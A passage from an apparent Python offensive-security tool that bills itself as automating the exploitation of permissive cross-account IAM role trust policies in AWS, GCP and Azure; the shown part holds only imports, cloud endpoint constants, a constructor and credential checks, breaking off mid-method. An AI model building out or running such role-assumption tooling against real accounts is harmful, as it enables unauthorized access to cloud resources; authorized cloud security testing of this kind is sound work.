#!/usr/bin/env python3
"""
Cross-Account IAM Role Trust Exploitation Tool

This module automates the identification and exploitation of overly permissive
cross-account IAM role trust policies across AWS, GCP, and Azure.
It tests whether an attacker with initial access can assume roles from external
accounts to gain unauthorized access to sensitive resources.
"""

import json
import time
import base64
import hashlib
import hmac
import re
import os
import sys
import logging
import datetime
import uuid
from typing import Dict, List, Optional, Any, Union

import requests

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('CrossAccountIAMTrustExploitation')


class CrossAccountIAMRoleTrustExploitationTool:
    """
    A tool to identify and exploit overly permissive cross-account IAM role
    trust policies across AWS, GCP, and Azure.

    This class provides methods to test role assumption capabilities from an
    attacker's perspective and generate reports of findings.
    """

    # AWS STS endpoint template (commercial)
    AWS_STS_ENDPOINT = "https://sts.amazonaws.com"
    AWS_STS_API_VERSION = "2011-06-15"

    # GCP endpoints
    GCP_IAM_CREDENTIALS_ENDPOINT = "https://iamcredentials.googleapis.com/v1"
    GCP_OAUTH2_TOKEN_ENDPOINT = "https://oauth2.googleapis.com/token"

    # Azure endpoints
    AZURE_AD_ENDPOINT = "https://login.microsoftonline.com"

    def __init__(
        self,
        provider: str,
        credentials: Dict[str, str],
        config: Optional[Dict[str, Any]] = None
    ):
        """
        Initialize the exploitation tool for a specific cloud provider.

        Args:
            provider: Cloud provider name ('aws', 'gcp', 'azure')
            credentials: Dictionary containing provider-specific credentials:
                - For AWS: 'access_key', 'secret_key', optional 'session_token'
                - For GCP: 'service_account_key_json' (path or JSON string)
                - For Azure: 'client_id', 'client_secret', 'tenant_id'
            config: Optional configuration dictionary:
                - 'region' (AWS default region)
                - 'delegates' (GCP service account delegates)
                - 'scopes' (OAuth scopes)
                - 'timeout' (HTTP request timeout)
                - 'verify_ssl' (SSL verification flag)
        """
        self.provider = provider.lower()
        self.credentials = credentials
        self.config = config or {}

        # Set default values
        self.timeout = self.config.get('timeout', 10)
        self.verify_ssl = self.config.get('verify_ssl', True)

        # Validate provider
        if self.provider not in ['aws', 'gcp', 'azure']:
            raise ValueError(f"Unsupported provider: {provider}. "
                             f"Supported: aws, gcp, azure")

        # Validate and prepare provider-specific credentials
        self._prepare_credentials()

        logger.info(f"Initialized {self.provider.upper()} exploitation tool")

    def _prepare_credentials(self) -> None:
        """Validate and convert credentials to internal format."""
        if self.provider == 'aws':
            required = ['access_key', 'secret_key']
            if not all(k in self.credentials for k in required):
                raise ValueError(
                    "AWS credentials require 'access_key' and 'secret_key'")
            self.aws_access_key = self.credentials['access_key']
            self.aws_secret_key = self.credentials['secret_key']
            self.aws_session_token = self.credentials.get('session_token')
            self.aws_region = self.config.get('region', 'us-east-1')

        elif self.provider == 'gcp':
            raw = self.credentials.get('service_account_key_json', '')
            if not raw:
                raise ValueError(
                    "GCP credentials require 'service_account_key_json'")